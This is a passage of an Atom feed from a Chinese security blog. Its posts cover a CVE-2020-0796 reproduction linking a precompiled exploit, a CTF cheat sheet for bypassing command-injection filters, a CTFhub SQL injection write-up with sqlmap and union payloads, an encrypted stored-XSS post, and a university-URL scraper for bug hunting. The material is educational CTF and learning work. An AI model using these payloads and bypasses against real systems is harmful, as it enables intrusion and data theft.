<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>shym&#39;s blog</title>
  
  <subtitle>shym&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https:///login546.github.io/"/>
  <updated>2021-01-22T08:48:08.990Z</updated>
  <id>https:///login546.github.io/</id>
  
  <author>
    <name>shym</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-0796复现</title>
    <link href="https:///login546.github.io/2020/04/01/CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
    <id>https:///login546.github.io/2020/04/01/CVE-2020-0796复现/</id>
    <published>2020-04-01T15:25:05.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2020-0796漏洞复现"><a href="#CVE-2020-0796漏洞复现" class="headerlink" title="CVE-2020-0796漏洞复现"></a>CVE-2020-0796漏洞复现</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>​    Microsoft Windows和Microsoft Windows Server都是美国微软（Microsoft）公司的产品，Microsoft Windows是一套个人设备使用的操作系统，Microsoft Windows Server是一套服务器操作系统，Server Message Block是其中的一个服务器信息传输协议。微软公布了在Server Message Block 3.0（SMBv3）中发现的“蠕虫型”预授权远程代码执行漏洞。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>​                适用于32位系统的Windows 10版本1903</p><p>　　　　Windows 10 1903版（用于基于x64的系统）</p><p>　　　　Windows 10 1903版（用于基于ARM64的系统）</p><p>　　　　Windows Server 1903版（服务器核心安装）</p><p>　　　　适用于32位系统的Windows 10版本1909</p><p>　　　　Windows 10版本1909（用于基于x64的系统）</p><p>　　　　Windows 10 1909版（用于基于ARM64的系统）</p><p>　　　　Windows Server版本1909（服务器核心安装）</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li><a href="ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|/" target="_blank" rel="noopener">win10-1903版本下载</a></li><li><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">exploit地址</a></li></ul><p>exp需要自己编译，这里放个编译好的</p><ul><li><a href="https://github.com/login546/login546.github.io/blob/hexo/source/_posts/download/cve-2020-0796-local.exe" target="_blank" rel="noopener">已编译文件下载</a></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://user-images.githubusercontent.com/38073810/78111105-c1fb2200-742e-11ea-8d7d-db88277b493b.jpg" alt="13861585722652_ pic_hd"></p><h3 id="复现注意"><a href="#复现注意" class="headerlink" title="复现注意"></a>复现注意</h3><p>需系统未安装更新补丁KB4551762</p><p><img src="https://user-images.githubusercontent.com/38073810/78115136-ebb74780-7434-11ea-93f9-1522ab8ca221.jpg" alt="13891585724611_ pic"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0796" target="_blank" rel="noopener">修复补丁</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2020-0796漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2020-0796漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-0796漏洞复现&quot;&gt;&lt;/a&gt;CVE-2020-0796漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https:///login546.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE-2020-0796" scheme="https:///login546.github.io/tags/CVE-2020-0796/"/>
    
  </entry>
  
  <entry>
    <title>RCE远程命令执行绕过</title>
    <link href="https:///login546.github.io/2020/03/17/RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
    <id>https:///login546.github.io/2020/03/17/RCE远程命令执行绕过/</id>
    <published>2020-03-17T17:01:45.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<p>做ctfhub后小总结，以及参考</p><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag //重定向符</span><br><span class="line">cat&lt;&gt;flag //重定向符</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>flag //IFS</span><br><span class="line">可能也过滤了&#123;&#125;，用<span class="variable">$IFS</span><span class="variable">$1</span>代替：</span><br><span class="line">?ip=127.0.0.1;cat<span class="variable">$IFS</span><span class="variable">$1index</span>.php</span><br><span class="line">cat%09flag //其他字符代替</span><br><span class="line">&#123;cat,flag&#125; //&#123;,&#125;</span><br></pre></td></tr></table></figure><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line"></span><br><span class="line">windows中：%0a、&amp;、|、%1a（.bat文件中的命令分隔符）</span><br><span class="line"></span><br><span class="line">;： 在 shell 中，担任”连续指令”功能的符号就是”分号”。命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。</span><br><span class="line"></span><br><span class="line">&amp;：简单拼接 无制约</span><br><span class="line"></span><br><span class="line">&amp;&amp;：前面执行成功后面才会执行</span><br><span class="line"></span><br><span class="line">|：符号 左边输出 作为右边输入，所以左边的输出并不显示。当第一条命令失败时，它仍然会执行第二条命令</span><br><span class="line"></span><br><span class="line">||：前面执行失败才会执行后面</span><br></pre></td></tr></table></figure><h2 id="敏感字符过滤绕过"><a href="#敏感字符过滤绕过" class="headerlink" title="敏感字符过滤绕过"></a>敏感字符过滤绕过</h2><p>过滤ls、cat、flag等</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base"><a href="#base" class="headerlink" title="base"></a>base</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">echo</span> <span class="string">'cat'</span> | base64</span><br><span class="line">Y2F0Cg==</span><br><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% `<span class="built_in">echo</span> <span class="string">'Y2F0Cg=='</span> | base64 -d` flag.txt</span><br><span class="line">flag&#123;sadas_sadsad_sadasdad-sdsad&#125;</span><br><span class="line">[shymdembp:~]</span><br></pre></td></tr></table></figure><h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">echo</span> <span class="string">"63617420666C61672E747874"</span> | xxd -r -p|bash</span><br><span class="line">flag&#123;sadas_sadsad_sadasdad-sdsad&#125;</span><br><span class="line">[shymdembp:~]</span><br><span class="line">[shym]%</span><br></pre></td></tr></table></figure><h4 id="oct-八进制"><a href="#oct-八进制" class="headerlink" title="oct(八进制)"></a>oct(八进制)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">printf</span> <span class="string">"\154\163"</span></span><br><span class="line">ls%                                                                             [shymdembp:~]</span><br><span class="line">[shym]% <span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span></span><br><span class="line">cat /flag%</span><br></pre></td></tr></table></figure><h3 id="连字符绕过"><a href="#连字符绕过" class="headerlink" title="连字符绕过"></a>连字符绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% ca<span class="string">''</span>t flag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% ca<span class="string">''</span>t fl<span class="string">''</span>ag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% c<span class="string">''</span>at fla<span class="string">''</span>g</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br></pre></td></tr></table></figure><h3 id="变量绕过"><a href="#变量绕过" class="headerlink" title="变量绕过"></a>变量绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span></span><br></pre></td></tr></table></figure><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shym]% ca\t fl\ag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br><span class="line">[shymdembp:<span class="built_in">test</span>]</span><br><span class="line">[shym]% c\at f\lag</span><br><span class="line">flag&#123;123-4123--213-213-123&#125;</span><br></pre></td></tr></table></figure><h3 id="ip进制转换绕过"><a href="#ip进制转换绕过" class="headerlink" title="ip进制转换绕过"></a>ip进制转换绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//ip地址过滤可将ip地址转化为数字ip地址</span><br><span class="line"></span><br><span class="line">IP地址用“点分十进制”表示，用“.”分成4部分；数字地址是一串用“十进制”表示的数字。</span><br><span class="line">　 比如：百度的IP地址“39.156.69.79”转换成数字地址就是“664552783”。在浏览器中输入664552783就可以访问百度网站</span><br><span class="line">转化网址：http://www.msxindl.com/tools/ip/ip_num.asp</span><br></pre></td></tr></table></figure><h2 id="无回显创建文件绕过"><a href="#无回显创建文件绕过" class="headerlink" title="无回显创建文件绕过"></a>无回显创建文件绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下用1&gt;1 可创建文件名为1的空文件。</span><br><span class="line">a&gt;1 虽报错，但可以创建空文件。</span><br><span class="line">ls&gt;1 把ls的内容导入1中</span><br></pre></td></tr></table></figure><p>在做这类题目时，一部分会给出源代码，我们可以直接参考源代码进行选择绕过让法。</p><p>如果没有，我们需要去猜测后台语句如何构造的，过滤了哪些，还有哪些可以用，然后结合各种绕过方式构造payload。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;做ctfhub后小总结，以及参考&lt;/p&gt;
&lt;h2 id=&quot;空格过滤&quot;&gt;&lt;a href=&quot;#空格过滤&quot; class=&quot;headerlink&quot; title=&quot;空格过滤&quot;&gt;&lt;/a&gt;空格过滤&lt;/h2&gt;&lt;p&gt;空格过滤的情况下，可以通过利用重定向符、IFS、其他字符代替、{,}等方法进
      
    
    </summary>
    
      <category term="Bypass" scheme="https:///login546.github.io/categories/Bypass/"/>
    
    
      <category term="CTFhub-RCE" scheme="https:///login546.github.io/tags/CTFhub-RCE/"/>
    
  </entry>
  
  <entry>
    <title>CTFhub注入题目</title>
    <link href="https:///login546.github.io/2020/03/04/CTFhub%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE/"/>
    <id>https:///login546.github.io/2020/03/04/CTFhub注入题目/</id>
    <published>2020-03-04T16:46:33.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>CTFHub SQL 整数型注入</p><h3 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://challenge-4ac9e4a80dea47f1.sandbox.ctfhub.com:10080/?id=12345&quot; -D sqli -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75864111-8162b580-5e3c-11ea-8fb1-41a231c03db5.png" alt="image"></p><h3 id="手注"><a href="#手注" class="headerlink" title="手注"></a>手注</h3><p>当我们输入提示的数字1时，前端仅显示了一条数据</p><p><img src="https://user-images.githubusercontent.com/38073810/75861793-d8ff2200-5e38-11ea-9f8d-b47a6d0bdd90.png" alt="image"></p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1 limit 1 offset 0回显---&gt;ID=1 Data:ctfhub</span><br><span class="line">1 or 1=1 limit 1 offset 2   回显---&gt;ID=114514 Data:sqli</span><br><span class="line"></span><br><span class="line">12345 union select database(),2 回显---&gt;ID: sqli Data:2</span><br></pre></td></tr></table></figure><p>然后information_schema一把梭</p><p>先查表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345 union select group_concat(table_name),2 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75863367-4d3ac500-5e3b-11ea-8a11-a9c2c6a11457.png" alt="image"></p><p>再查字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345 union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;flag&apos;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75863140-faf9a400-5e3a-11ea-9f9f-9dc6a651d01b.png" alt="image"></p><p>注入得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345 union select flag,2 from sqli.flag</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75863322-3d22e580-5e3b-11ea-92b1-ed782381b3be.png" alt="image"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>CTFHub SQL字符型注入</p><h3 id="sqlmap一把梭-1"><a href="#sqlmap一把梭-1" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://challenge-940a484565709b61.sandbox.ctfhub.com:10080/?id=11111&quot; -D sqli -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75870302-c4755680-5e45-11ea-9c77-448ed2c3a843.png" alt="image"></p><h3 id="手注-1"><a href="#手注-1" class="headerlink" title="手注"></a>手注</h3><p>我们输入1看到和整数型注入是一样的，只有两处回显。</p><p>然后我们注意引号和注释直接联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345&apos; union select database(),2 &apos;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75865503-a0624700-5e3e-11ea-84dd-43cfbf41d885.png" alt="image"></p><p>查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345&apos; union select group_concat(table_name),2 from information_schema.tables where table_schema=&apos;sqli&apos; &apos;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75865885-29797e00-5e3f-11ea-8411-f98a413373fa.png" alt="image"></p><p>查字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345&apos; union select group_concat(column_name) ,2 from information_schema.columns where table_name=&apos;flag&apos; #</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75869982-50d34980-5e45-11ea-97f6-a4639db98034.png" alt="image"></p><p>注入得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12345&apos; union select flag,2 from sqli.flag #</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/75870595-26ce5700-5e46-11ea-852c-00eb08c034da.png" alt="image"></p><p>将持续更新。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;h2 id=&quot;整数型注入&quot;&gt;&lt;a href=&quot;#整数型注入&quot; class=&quot;headerlink&quot; title=&quot;整数型
      
    
    </summary>
    
      <category term="writeup" scheme="https:///login546.github.io/categories/writeup/"/>
    
    
      <category term="CTFhub" scheme="https:///login546.github.io/tags/CTFhub/"/>
    
  </entry>
  
  <entry>
    <title>某智慧校园系统存储型xss</title>
    <link href="https:///login546.github.io/2020/02/21/%E6%9F%90%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"/>
    <id>https:///login546.github.io/2020/02/21/某智慧校园系统存储型xss/</id>
    <published>2020-02-21T22:45:21.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="064dd2e9775a2c9343179c114f2cea81e20cce53c341dcd160fe43cc86f64b41">dd5bc9b2e86e805c43844b8c7f0c5c89844aa2e1480dbcaca8de5d95686e56c1e76f1a5b0bfda9ef05feb0826948479b722f1f66bc8d96931ba6525d5f3178302aa17010fb080de71393b94dcd47e0a88eaa5a7f770de04472a101f242a06006786ae8eb1307f3f0f120216358b2819e06a6a88b9baa26a7b32f985e5e34ef934b2d5f9c8633a9668520c386ec1582754ca97043b32a1b8a884dc425ac0b346be735b7eb353b903a82ec7a18b93b2afbfac23fa8261bc24768299eb62583f3d4a31be3e57591644c1debbda21dc57c05b8f7c580b6fdb60e1d99ea501bb9d66ec2c59ec2c23e74e26da8328008081e80c15c9edde89ce41d0ca7622dbe47980211e3dd9cb9b96cf243bb0f486ff2f8338ffc84e2d08c10981c22c96efe241afa60793dce6f72a8597d68a86d502d895c9c4f3fb273933c7103626620f4ce23781728d0bbe191dc15ecd39b133ee34aeb25815e48aa05ed1fc99cedfa862bb910936a7e9a607791c26ac6c918d9c64c545ef0894aad62c8114a3ede40c2114a2aec54ad7408ad98876f5c0c486160dc1e0973bf745870de060cd499dd90e3082b4710d268a21058e50257dbb0282a3ea6962af8460275923a80ddc03eede58c2259c97a7d7de82b93eb560534efa7cba8a1e0ae7f0a379aa91252347b8f2e9ae9fa62ed4b45c8eb89cefa2fc5cf66f10de35d5a0632b479128d644728744ea79afb07a6ffabee708189c0ed29f50e1b338a6cfdcd6b465f303c460806e961f534c35657c93cb743385c78289027b25b7f6cdb2d3817d95534d3a1d3986fa12230424d301dd33cdf50acb647be87fac5903d9e333ff64bfe358dafee0efe8e8a4539824cad166b31f80491a2bccd2fc851701b2c08ebe5748a6a5dc68f3bd46c479e4e7282cb45b1fe51c0ed586fde71b2e6f0bb0e16aad049b9a43da5a96752bd2eb8bec17e6c72757e4fa994ca40dbe5d9d6f1f6f1c967021035b8687526ffef10c8139350309dc7e13688c7f2c319b7</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      成功插入payload，弹出窗口
    
    </summary>
    
      <category term="通用漏洞挖掘" scheme="https:///login546.github.io/categories/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="存储型xss" scheme="https:///login546.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"/>
    
  </entry>
  
  <entry>
    <title>爬区国内所有高校名单</title>
    <link href="https:///login546.github.io/2019/12/30/%E7%88%AC%E5%8C%BA%E5%9B%BD%E5%86%85%E6%89%80%E6%9C%89%E9%AB%98%E6%A0%A1%E5%AE%98%E7%BD%91%E5%9C%B0%E5%9D%80/"/>
    <id>https:///login546.github.io/2019/12/30/爬区国内所有高校官网地址/</id>
    <published>2019-12-30T11:26:50.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<p>在挖教育src时，发现手动找高校链接太慢，于是网上搜了下在<a href="http://www.hao123.com/edu" target="_blank" rel="noopener">http://www.hao123.com/edu</a></p><p>发现了收录了国内高校的链接即名称，嘿嘿～</p><h2 id="爬取各地大学链接"><a href="#爬取各地大学链接" class="headerlink" title="爬取各地大学链接"></a>爬取各地大学链接</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen<span class="comment">#用于获取网页</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup<span class="comment">#用于解析网页</span></span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">'http://www.hao123.com/edu'</span>)<span class="comment">#爬取带大学url的页面</span></span><br><span class="line">bsObj = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br><span class="line">t1 = bsObj.find_all(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> t2 <span class="keyword">in</span> t1:</span><br><span class="line">    t3 = t2.get(<span class="string">'href'</span>)</span><br><span class="line">    print(t3)</span><br></pre></td></tr></table></figure><p>筛选得到的url</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">http://www.hao123.com/eduhtm/edubj.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edubj02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edubj03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edubj04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edutj.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edutj02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/tj03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/tj04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hb.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hb02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hb03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/hb04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jilin.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jilin02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jilin03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/jilin04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/numeg.htm</span><br><span class="line">http://www.hao123.com/eduhtm/nmg02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/nmg03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/nmg04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/shnagxi.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sx02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sx03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sx04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edusy.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ln02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ln03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/ln04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guansu.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gs02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gs03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gs04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/edush.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sh02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sh03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/sh04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/guangxi.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gx02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gx03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/gx04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/eduhz.htm</span><br><span class="line">http://www.hao123.com/eduhtm/zj02.htm</span><br><span class="line">http://www.hao123.com/eduhtm/zj03.htm</span><br><span class="line">http://www.hao123.com/eduhtm/zj04.htm</span><br><span class="line">http://www.hao123.com/eduhtm/anfei.htm</span><br><span 